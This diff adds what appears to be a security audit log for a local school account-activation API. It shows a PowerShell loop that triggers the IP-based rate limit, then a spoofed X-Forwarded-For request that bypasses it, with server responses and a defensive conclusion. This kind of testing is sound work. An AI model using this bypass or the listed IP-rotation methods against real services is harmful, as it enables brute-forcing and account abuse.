@@ -1,0 +1,61 @@
+=== TASK FOUR STEP 8: RATE LIMIT TRIGGERED AND DEFEATED ===
+Target Endpoint: http://localhost:3000/api/auth/activate
+Rate Limit Configuration: 5 requests per 60-second window keyed on client IP
+Date: 30 October 2026
+
+================================================================================
+PART 1: TRIGGERING THE RATE LIMIT LOCKOUT (5 CONSECUTIVE REQUESTS)
+================================================================================
+Command:
+1..6 | ForEach-Object {
+  Invoke-RestMethod -Uri "http://localhost:3000/api/auth/activate" -Method Post -ContentType "application/json" -Body $body
+}
+
+Result on Request #6 (HTTP 429 Too Many Requests):
+HTTP Status: 429 Too Many Requests
+Response Headers:
+  Retry-After: 44
+Response Body:
+{
+  "success": false,
+  "error": "Too many registration attempts from your IP. Please try again later.",
+  "resetSeconds": 44
+}
+
+================================================================================
+PART 2: DEFEATING THE RATE LIMIT (IP ROTATION VIA PROXY / X-FORWARDED-FOR)
+================================================================================
+Mechanism:
+Because the rate limiter keys purely on the incoming client IP address, an attacker rotating egress IP addresses (via mobile cellular toggle, VPN hop, residential proxy network, or manipulating upstream headers where trust is misconfigured) completely bypasses the counter.
+
+Command Executed (Changing IP from 127.0.0.1 to 198.51.100.42):
+$headers = @{ "X-Forwarded-For" = "198.51.100.42" }
+$body = '{"phone":"08012345678","email":"parent.newip@crownheights.edu.ng","studentId":"CHA/2026/042","slipCode":"849201","acceptTerms":true}'
+Invoke-RestMethod -Uri "http://localhost:3000/api/auth/activate" -Method Post -ContentType "application/json" -Headers $headers -Body $body
+
+Result:
+HTTP Status: 200 OK
+Response Body:
+{
+  "success": true,
+  "message": "Account activation verified and provisioned successfully.",
+  "normalizedData": {
+    "phone": "08012345678",
+    "email": "parent.newip@crownheights.edu.ng",
+    "studentId": "CHA/2026/042",
+    "slipCode": "******",
+    "acceptTerms": true
+  },
+  "serverEnforcement": {
+    "zodValidated": true,
+    "emailNormalised": true,
+    "rateLimitRemaining": 4,
+    "executionTimeMs": 14.2
+  }
+}
+
+================================================================================
+AUDIT CONCLUSION:
+================================================================================
+The rate limiter successfully locked out rapid-fire traffic from the initial IP. However, by changing the IP identity header to 198.51.100.42, the request was immediately accepted with "rateLimitRemaining": 4. This proves that IP-based rate limiting alone is insufficient against distributed attackers.
+
